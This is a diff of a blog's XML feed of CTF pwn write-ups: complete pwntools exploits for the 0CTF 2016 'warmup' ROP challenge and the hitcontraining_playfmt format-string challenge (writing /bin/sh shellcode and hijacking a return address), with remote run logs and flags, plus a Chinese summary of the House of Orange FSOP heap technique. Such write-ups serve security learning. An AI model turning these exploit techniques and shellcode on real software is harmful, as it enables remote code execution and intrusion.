class="string">&quot;alarm time: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(toc-tic))</span><br><span class="line">time.sleep(<span class="number">5</span> - (toc - tic))</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(alarm)</span><br><span class="line">payload += p32(mov_esp_bcd_int)</span><br><span class="line">payload += p32(stackoverlow)</span><br><span class="line">payload += p32(buffer)  <span class="comment">#ebx file_name</span></span><br><span class="line">payload += p32(<span class="number">0</span>)       <span class="comment">#ecx flags (0: O_RDONLY, 1: O_WRONLY, 2: O_RDWR)</span></span><br><span class="line"><span class="comment"># payload += p32(0)       #edx</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="keyword">if</span> args.GDB:</span><br><span class="line">    ctn = io.recvuntil(<span class="string">b&quot;Good Luck!\n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ctn = io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment">##### 3.  read flag content into buffer</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(read)</span><br><span class="line">payload += p32(stackoverlow)</span><br><span class="line">payload += p32(<span class="number">3</span>)       <span class="comment">#fd</span></span><br><span class="line">payload += p32(buffer)  <span class="comment">#addr</span></span><br><span class="line">payload += p32(<span class="number">0x100</span>)   <span class="comment">#len</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="keyword">if</span> args.GDB:</span><br><span class="line">    ctn = io.recvuntil(<span class="string">b&quot;Good Luck!\n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ctn = io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment">##### 4.  write flag content into stdout</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(write)</span><br><span class="line">payload += p32(stackoverlow)    <span class="comment">#call valid function to make binary happy, exploit stable</span></span><br><span class="line">payload += p32(<span class="number">1</span>)       <span class="comment">#fd</span></span><br><span class="line">payload += p32(buffer)  <span class="comment">#addr</span></span><br><span class="line">payload += p32(<span class="number">0x100</span>)   <span class="comment">#len</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="keyword">if</span> args.GDB:</span><br><span class="line">    ctn = io.recvuntil(<span class="string">b&quot;Good Luck!\n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ctn = io.recvline()</span><br><span class="line"></span><br><span class="line">flag = io.recv()</span><br><span class="line">log.info(<span class="string">f&quot;flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># io.interactive()</span></span><br><span class="line">io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="0x4-output-example"><a class="markdownIt-Anchor" href="#0x4-output-example"></a> 0x4 Output Example</h1>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">╰─$ python exp.py REMOTE   </span><br><span class="line"></span><br><span class="line">[*] &#x27;warmup/warmup&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Opening connection to node4.buuoj.cn on port 25353: Done</span><br><span class="line">[DEBUG] Received 0x16 bytes:</span><br><span class="line">    b&#x27;Welcome to 0CTF 2016!\n&#x27;</span><br><span class="line">[DEBUG] Sent 0x34 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">    *</span><br><span class="line">    00000020  1d 81 04 08  5a 81 04 08  00 00 00 00  00 96 04 08  │····│Z···│····│····│</span><br><span class="line">    00000030  06 00 00 00                                         │····│</span><br><span class="line">    00000034</span><br><span class="line">[DEBUG] Received 0xb bytes:</span><br><span class="line">    b&#x27;Good Luck!\n&#x27;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    00000000  66 6c 61 67  00                                     │flag│·│</span><br><span class="line">    00000005</span><br><span class="line">[*] alarm time: 0.08231258392333984</span><br><span class="line">[DEBUG] Sent 0x34 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">    *</span><br><span class="line">    00000020  0d 81 04 08  22 81 04 08  5a 81 04 08  00 96 04 08  │····│&quot;···│Z···│····│</span><br><span class="line">    00000030  00 00 00 00                                         │····│</span><br><span class="line">    00000034</span><br><span class="line">[DEBUG] Received 0xb bytes:</span><br><span class="line">    b&#x27;Good Luck!\n&#x27;</span><br><span class="line">[DEBUG] Sent 0x34 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">    *</span><br><span class="line">    00000020  1d 81 04 08  5a 81 04 08  03 00 00 00  00 96 04 08  │····│Z···│····│····│</span><br><span class="line">    00000030  00 01 00 00                                         │····│</span><br><span class="line">    00000034</span><br><span class="line">[DEBUG] Received 0xb bytes:</span><br><span class="line">    b&#x27;Good Luck!\n&#x27;</span><br><span class="line">[DEBUG] Sent 0x34 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">    *</span><br><span class="line">    00000020  35 81 04 08  5a 81 04 08  01 00 00 00  00 96 04 08  │5···│Z···│····│····│</span><br><span class="line">    00000030  00 01 00 00                                         │····│</span><br><span class="line">    00000034</span><br><span class="line">[DEBUG] Received 0xb bytes:</span><br><span class="line">    b&#x27;Good Luck!\n&#x27;</span><br><span class="line">[DEBUG] Received 0x100 bytes:</span><br><span class="line">    00000000  66 6c 61 67  7b 31 38 31  31 61 64 61  65 2d 38 35  │flag│&#123;181│1ada│e-85│</span><br><span class="line">    00000010  31 38 2d 34  38 31 36 2d  61 66 66 32  2d 30 31 65  │18-4│816-│aff2│-01e│</span><br><span class="line">    00000020  65 65 62 32  64 63 62 33  38 7d 0a 00  00 00 00 00  │eeb2│dcb3│8&#125;··│····│</span><br><span class="line">    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    *</span><br><span class="line">    00000100</span><br><span class="line">[*] flag: b&#x27;flag&#123;▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇&#125;\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">[*] Closed connection to node4.buuoj.cn port 25353</span><br></pre></td></tr></table></figure>
+<h1 id="0x5-the-challenge"><a class="markdownIt-Anchor" href="#0x5-the-challenge"></a> 0x5 The Challenge</h1>
+<p><a href="https://buuoj.cn/challenges#warmup">https://buuoj.cn/challenges#warmup</a></p>
+]]></content>
+      <categories>
+        <category>Write Up</category>
+        <category>Stack Overflow</category>
+      </categories>
+      <tags>
+        <tag>Write Up</tag>
+        <tag>Stack Overflow</tag>
+        <tag>alarm</tag>
+        <tag>system call</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HeapAttack: House_of_Orange</title>
+    <url>/2022/03/25/HeapAttack-House-of-Orange/</url>
+    <content><![CDATA[<h2 id="漏洞样式"><a class="markdownIt-Anchor" href="#漏洞样式"></a> 漏洞样式</h2>
+<ul>
+<li>漏洞要求：libc-leak， 任意地址写(_IO_list_all劫持), 大块chunk控制(伪造_IO_FILE结构)</li>
+<li>libc版本：glibc-2.3及以下</li>
+</ul>
+<h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2>
+<h3 id="21-攻击效果"><a class="markdownIt-Anchor" href="#21-攻击效果"></a> 2.1 攻击效果</h3>
+<ul>
+<li>GetShell：<br />
+通过劫持_IO_list_all.vtable中某函数指针，篡改为system或one_gadget, 并伪造_IO_FILE结构从而使程序在调用 _IO_flush_all_lockp 函数后能够最终调用到system或one_gadet。_IO_flush_all_lockp</li>
+</ul>
+<h3 id="22-过程简述"><a class="markdownIt-Anchor" href="#22-过程简述"></a> 2.2 过程简述</h3>
+<ul>
+<li>
+<ol>
+<li>使用unsortedbin attack，largebin attack，tcache dup、House Of Botcake等任意地址写技术将_IO_list_all改写为攻击者可控内存地址(记为fakeIOList)。</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>在fakeIOList上布置内存布局，使得以类型Struct _IO_File 解析fakeIOList</li>
+</ol>
+<ul>
+<li>a. fp-&gt;_mode &lt;= 0</li>
+<li>b. fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li>
+</ul>
+</li>
+<li>
+<ol start="3">
+<li>vtable 指向可控内存区域，修改 vtable-&gt;__overflow 为目标函数(system或者one_gadget)</li>
+</ol>
+</li>
+<li>
+<ol start="4">
+<li>[可选的]若vtable-&gt;__overflow指向system。可将fp-&gt;_flags 写成b&quot;/bin/sh\0&quot;。因为最终调用的代码是：</li>
+</ol>
+<blockquote>
+<p>_IO_OVERFLOW (fp, EOF)<br />
+即</p>
+</blockquote>
+<blockquote>
+<p>fp-&gt;vtable-&gt;__overflow(fp)</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="3-注意"><a class="markdownIt-Anchor" href="#3-注意"></a> 3. 注意</h2>
+<p>参考链接(IO FILE 之劫持vtable及FSOP)中的以下两个技巧的学习：</p>
+<ol>
+<li>通过mmap 0x200000的超大chunk，该chunk会恰好分配在libc的上方，这样可以leak libc地址。</li>
+<li>当top_chunk size不够分配内存时，main_arena会sbrk新的page；若旧top_chunk的末尾地址与sbrk新分配内存的开始地址不邻接，则会把旧top_chunk free掉。我们这样就不经过free获得了一个unsortedbin chunk。</li>
+</ol>
+<h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2>
+<ol>
+<li><a href="https://xz.aliyun.com/t/5508">IO FILE 之劫持vtable及FSOP</a></li>
+<li><a href="https://xz.aliyun.com/t/5579">IO FILE 之vtable check 以及绕过</a></li>
+<li><a href="https://www.52pojie.cn/thread-1539815-1-1.html">从零开始的Linux堆利用(七)——House of Orange</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>HeapAttack</category>
+        <category>FSOP</category>
+      </categories>
+      <tags>
+        <tag>HeapAttack</tag>
+        <tag>_IO_list_all</tag>
+        <tag>unsortedbin attack</tag>
+        <tag>FSOP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>WriteUp: hitcontraining_playfmt</title>
     <url>/2022/04/11/WriteUp-hitcontraining-playfmt/</url>
     <content><![CDATA[<h1 id="checksec"><a class="markdownIt-Anchor" href="#checksec"></a> Checksec</h1>
@@ -409,7 +363,7 @@ executed).】</p>
 <h1 id="exploit-code"><a class="markdownIt-Anchor" href="#exploit-code"></a> Exploit Code</h1>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util <span class="keyword">import</span> misc</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;playfmt&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        p = process(elf.path)</span><br><span class="line">        cmd = [<span class="string">&quot;gdb&quot;</span>, <span class="string">&quot;-p&quot;</span>, <span class="built_in">str</span>(p.pid)]</span><br><span class="line">        cmd = context.terminal + cmd</span><br><span class="line">        cmd = <span class="string">&#x27; &#x27;</span>.join(cmd) </span><br><span class="line">        os.system(cmd)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:</span><br><span class="line">        <span class="keyword">return</span> remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28106</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------- Process Interactive ---------------------</span></span><br><span class="line"></span><br><span class="line">l = <span class="keyword">lambda</span> x,y : log.info(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span> -&gt; <span class="subst">&#123;y&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readByFmtStr</span>(<span class="params">fmtstr</span>):</span><br><span class="line">    io.send(fmtstr)</span><br><span class="line">    addr = <span class="built_in">int</span>(io.recv(), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">io.timeout = <span class="number">3000</span></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ebp = readByFmtStr(<span class="string">b&quot;%6$p&quot;</span>)</span><br><span class="line">l(<span class="string">&quot;ebp&quot;</span>, <span class="built_in">hex</span>(ebp))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak chain value </span></span><br><span class="line">chain = readByFmtStr(<span class="string">b&quot;%21$p&quot;</span>)</span><br><span class="line">l(<span class="string">&quot;chain&quot;</span>, <span class="built_in">hex</span>(chain))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mul ecx</span></span><br><span class="line"><span class="string">push eax</span></span><br><span class="line"><span class="string">mov al,0xb</span></span><br><span class="line"><span class="string">push 0x68732f2f   </span></span><br><span class="line"><span class="string">push 0x6e69622f   </span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shell_bs = asm(shell, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">check = disasm(shell_bs)</span><br><span class="line">l(<span class="string">&quot;check&quot;</span>, check)</span><br><span class="line"></span><br><span class="line">l(<span class="string">&quot;shell_bs&quot;</span>, shell_bs)</span><br><span class="line">hexstr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shell_bs)):</span><br><span class="line">    hexstr += <span class="string">&#x27;\\x&#x27;</span> +  <span class="built_in">hex</span>(shell_bs[i])[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">l(<span class="string">&quot;hexstr&quot;</span>, hexstr)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 将shellcode放到chain-0x300的位置</span></span><br><span class="line"></span><br><span class="line">shell_addr = chain &amp; <span class="number">0xffff00ff</span></span><br><span class="line">l(<span class="string">&quot;shell_addr&quot;</span>, <span class="built_in">hex</span>(shell_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">## write int8 value to address by low16</span></span><br><span class="line"><span class="comment"># 通过栈低16位定位写入地址，写入指定值(int8)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_int8</span>(<span class="params">addr_low16, byte_value</span>):</span><br><span class="line">    log.info(<span class="string">f&quot;write_int8: <span class="subst">&#123;<span class="built_in">hex</span>(addr_low16)&#125;</span> <span class="subst">&#123;<span class="built_in">hex</span>(byte_value)&#125;</span>&quot;</span>)</span><br><span class="line">    addr_low16 = addr_low16 &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># change 0b:002c value low16</span></span><br><span class="line">    payload = <span class="string">f&quot;%<span class="subst">&#123;addr_low16&#125;</span>c%21$hn&quot;</span></span><br><span class="line">    payload = payload.encode()</span><br><span class="line">    payload += <span class="string">b&quot;\n\x00&quot;</span></span><br><span class="line">    <span class="comment"># log.info(f&quot;payload 1: &#123;payload&#125;&quot;)</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    ctn = <span class="string">&quot;&quot;</span></span><br><span class="line">    ctn = io.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># change addr_low16 value </span></span><br><span class="line">    payload = <span class="string">f&quot;%<span class="subst">&#123;byte_value&#125;</span>c%57$hhn&quot;</span></span><br><span class="line">    <span class="keyword">if</span> byte_value == <span class="number">0</span>:</span><br><span class="line">        payload = <span class="string">f&quot;%57$hhn&quot;</span></span><br><span class="line">    payload = payload.encode()</span><br><span class="line">    payload += <span class="string">b&quot;\n\x00&quot;</span></span><br><span class="line">    <span class="comment"># log.info(f&quot;payload 2: &#123;payload&#125;&quot;)</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    ctn = <span class="string">&quot;&quot;</span></span><br><span class="line">    ctn = io.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shell_bs)):</span><br><span class="line">    aByte = shell_bs[i]</span><br><span class="line">    addr_low16 = shell_addr + i</span><br><span class="line"></span><br><span class="line">    write_int8(addr_low16, aByte)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # 返回地址修改为shell_addr</span></span><br><span class="line"></span><br><span class="line">ret_addr = ebp - <span class="number">0xc</span>    <span class="comment"># 0xff88e6d4 - 0xe8  --&gt; esp </span></span><br><span class="line">l(<span class="string">&quot;ret_addr&quot;</span>, <span class="built_in">hex</span>(ret_addr))</span><br><span class="line"></span><br><span class="line">shell_addr_bs = p32(shell_addr)</span><br><span class="line">l(<span class="string">&quot;shell_addr&quot;</span>, <span class="built_in">hex</span>(shell_addr))</span><br><span class="line"><span class="comment"># l(&quot;shell_addr_bs&quot;, shell_addr_bs)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shell_addr_bs)):</span><br><span class="line">    aByte = shell_addr_bs[i]</span><br><span class="line">    addr_low16 = ret_addr + i</span><br><span class="line"></span><br><span class="line">    write_int8(addr_low16, aByte)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # quit 触发返回</span></span><br><span class="line">io.sendline(<span class="string">b&quot;quit&quot;</span>)</span><br><span class="line"><span class="comment"># ctn = io.recv()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####### Got Shell #######</span></span><br><span class="line"><span class="comment"># cat flag</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">flag = io.recv()</span><br><span class="line">log.info(<span class="string">f&quot;flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============================================================</span></span><br><span class="line"><span class="comment"># io.interactive()</span></span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### 附录：</span></span><br><span class="line"><span class="comment">#    </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">16:0058│     0xff88e644 —▸ 0xff88e6d4 —▸ 0xff8900ca ◂— &#x27;../playfmt&#x27;</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">3a:00e8│     0xff88e6d4 —▸ 0xff8900ca ◂— &#x27;../playfmt&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h1 id="output-example"><a class="markdownIt-Anchor" href="#output-example"></a> Output Example</h1>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">╰─$ python exp.py REMOTE</span><br><span class="line">[*] &#x27;hitcontraining_playfmt/playfmt&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">[*] &#x27;/lib/i386-linux-gnu/libc-2.27.so&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to node4.buuoj.cn on port 28106: Done</span><br><span class="line">[*] ebp -&gt; 0xffb2d448</span><br><span class="line">[*] chain -&gt; 0xffb2d504</span><br><span class="line">[*] check -&gt;    0:   31 c9                   xor    ecx, ecx</span><br><span class="line">       2:   f7 e1                   mul    ecx</span><br><span class="line">       4:   50                      push   eax</span><br><span class="line">       5:   b0 0b                   mov    al, 0xb</span><br><span class="line">       7:   68 2f 2f 73 68          push   0x68732f2f</span><br><span class="line">       c:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">      11:   89 e3                   mov    ebx, esp</span><br><span class="line">      13:   cd 80                   int    0x80</span><br><span class="line">[*] shell_bs -&gt; b&#x27;1\xc9\xf7\xe1P\xb0\x0bh//shh/bin\x89\xe3\xcd\x80&#x27;</span><br><span class="line">[*] hexstr -&gt; \x31\xc9\xf7\xe1\x50\xb0\xb\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><br><span class="line">[*] shell_addr -&gt; 0xffb20004</span><br><span class="line">[*] write_int8: 0xffb20004 0x31</span><br><span class="line">[*] write_int8: 0xffb20005 0xc9</span><br><span class="line">[*] write_int8: 0xffb20006 0xf7</span><br><span class="line">[*] write_int8: 0xffb20007 0xe1</span><br><span class="line">[*] write_int8: 0xffb20008 0x50</span><br><span class="line">[*] write_int8: 0xffb20009 0xb0</span><br><span class="line">[*] write_int8: 0xffb2000a 0xb</span><br><span class="line">[*] write_int8: 0xffb2000b 0x68</span><br><span class="line">[*] write_int8: 0xffb2000c 0x2f</span><br><span class="line">[*] write_int8: 0xffb2000d 0x2f</span><br><span class="line">[*] write_int8: 0xffb2000e 0x73</span><br><span class="line">[*] write_int8: 0xffb2000f 0x68</span><br><span class="line">[*] write_int8: 0xffb20010 0x68</span><br><span class="line">[*] write_int8: 0xffb20011 0x2f</span><br><span class="line">[*] write_int8: 0xffb20012 0x62</span><br><span class="line">[*] write_int8: 0xffb20013 0x69</span><br><span class="line">[*] write_int8: 0xffb20014 0x6e</span><br><span class="line">[*] write_int8: 0xffb20015 0x89</span><br><span class="line">[*] write_int8: 0xffb20016 0xe3</span><br><span class="line">[*] write_int8: 0xffb20017 0xcd</span><br><span class="line">[*] write_int8: 0xffb20018 0x80</span><br><span class="line">[*] ret_addr -&gt; 0xffb2d43c</span><br><span class="line">[*] shell_addr -&gt; 0xffb20004</span><br><span class="line">[*] write_int8: 0xffb2d43c 0x4</span><br><span class="line">[*] write_int8: 0xffb2d43d 0x0</span><br><span class="line">[*] write_int8: 0xffb2d43e 0xb2</span><br><span class="line">[*] write_int8: 0xffb2d43f 0xff</span><br><span class="line">[*] flag: b&#x27;flag&#123;d02e5ce9-0de8-475d-9e7b-464aba182d47&#125;\n&#x27;</span><br><span class="line">[*] Closed connection to node4.buuoj.cn port 28106</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">╰─$ python exp.py REMOTE</span><br><span class="line">[*] &#x27;hitcontraining_playfmt/playfmt&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">[*] &#x27;/lib/i386-linux-gnu/libc-2.27.so&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to node4.buuoj.cn on port 28106: Done</span><br><span class="line">[*] ebp -&gt; 0xffb2d448</span><br><span class="line">[*] chain -&gt; 0xffb2d504</span><br><span class="line">[*] check -&gt;    0:   31 c9                   xor    ecx, ecx</span><br><span class="line">       2:   f7 e1                   mul    ecx</span><br><span class="line">       4:   50                      push   eax</span><br><span class="line">       5:   b0 0b                   mov    al, 0xb</span><br><span class="line">       7:   68 2f 2f 73 68          push   0x68732f2f</span><br><span class="line">       c:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">      11:   89 e3                   mov    ebx, esp</span><br><span class="line">      13:   cd 80                   int    0x80</span><br><span class="line">[*] shell_bs -&gt; b&#x27;1\xc9\xf7\xe1P\xb0\x0bh//shh/bin\x89\xe3\xcd\x80&#x27;</span><br><span class="line">[*] hexstr -&gt; \x31\xc9\xf7\xe1\x50\xb0\xb\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><br><span class="line">[*] shell_addr -&gt; 0xffb20004</span><br><span class="line">[*] write_int8: 0xffb20004 0x31</span><br><span class="line">[*] write_int8: 0xffb20005 0xc9</span><br><span class="line">[*] write_int8: 0xffb20006 0xf7</span><br><span class="line">[*] write_int8: 0xffb20007 0xe1</span><br><span class="line">[*] write_int8: 0xffb20008 0x50</span><br><span class="line">[*] write_int8: 0xffb20009 0xb0</span><br><span class="line">[*] write_int8: 0xffb2000a 0xb</span><br><span class="line">[*] write_int8: 0xffb2000b 0x68</span><br><span class="line">[*] write_int8: 0xffb2000c 0x2f</span><br><span class="line">[*] write_int8: 0xffb2000d 0x2f</span><br><span class="line">[*] write_int8: 0xffb2000e 0x73</span><br><span class="line">[*] write_int8: 0xffb2000f 0x68</span><br><span class="line">[*] write_int8: 0xffb20010 0x68</span><br><span class="line">[*] write_int8: 0xffb20011 0x2f</span><br><span class="line">[*] write_int8: 0xffb20012 0x62</span><br><span class="line">[*] write_int8: 0xffb20013 0x69</span><br><span class="line">[*] write_int8: 0xffb20014 0x6e</span><br><span class="line">[*] write_int8: 0xffb20015 0x89</span><br><span class="line">[*] write_int8: 0xffb20016 0xe3</span><br><span class="line">[*] write_int8: 0xffb20017 0xcd</span><br><span class="line">[*] write_int8: 0xffb20018 0x80</span><br><span class="line">[*] ret_addr -&gt; 0xffb2d43c</span><br><span class="line">[*] shell_addr -&gt; 0xffb20004</span><br><span class="line">[*] write_int8: 0xffb2d43c 0x4</span><br><span class="line">[*] write_int8: 0xffb2d43d 0x0</span><br><span class="line">[*] write_int8: 0xffb2d43e 0xb2</span><br><span class="line">[*] write_int8: 0xffb2d43f 0xff</span><br><span class="line">[*] flag: b&#x27;flag&#123;▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇&#125;\n&#x27;</span><br><span class="line">[*] Closed connection to node4.buuoj.cn port 28106</span><br></pre></td></tr></table></figure>
 <h1 id="the-challenge"><a class="markdownIt-Anchor" href="#the-challenge"></a> The Challenge</h1>
 <p><a href="https://buuoj.cn/challenges#hitcontraining_playfmt">https://buuoj.cn/challenges#hitcontraining_playfmt</a></p>
 ]]></content>
@@ -420,6 +374,106 @@ executed).】</p>
       <tags>
         <tag>Write Up</tag>
         <tag>Format String Attack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Shellcode Collection</title>
+    <url>/2022/03/21/shellcode/</url>
